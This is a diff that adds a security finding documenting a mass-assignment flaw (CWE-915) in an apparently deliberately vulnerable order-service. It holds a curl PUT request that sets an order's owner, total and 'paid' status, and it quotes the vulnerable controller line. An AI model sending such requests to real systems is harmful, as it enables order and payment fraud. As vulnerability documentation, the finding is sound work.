@@ -1,0 +1,21 @@
+# V3: Order mass assignment
+
+Baseline reference: baseline-vulnerable
+Primary mapping: CWE-915: Improperly Controlled Modification of Dynamically-Managed Object Attributes
+
+## Reproduction request
+
+```bash
+curl -i -X PUT http://localhost:5000/api/orders/0000000000000000000000e1 \
+  -H 'Content-Type: application/json' \
+  --data '{"userId":"CUSTOMER_B","totalAmount":1,"status":"paid"}'
+```
+
+## Baseline source result
+
+- PASS: order-service/src/controller/order.controller.js:113 contains `const updated = await Order.findByIdAndUpdate(req.params.id, req.body, { new: true });`
+- PASS: order-service/src/controller/order.controller.js:9 contains `const { userId, items, paymentMethod, totalAmount, currency, deliveryAddress, phoneNumber } = req.body;`
+
+Impact: The update path passes the complete request body to the persistence operation, allowing client-controlled protected attributes.
+
+This Phase 3 artifact is a reproducible source-level baseline proof. The curl request is the local HTTP reproduction recipe; live response captures are added after the affected local service is started. No live response is claimed by this artifact.
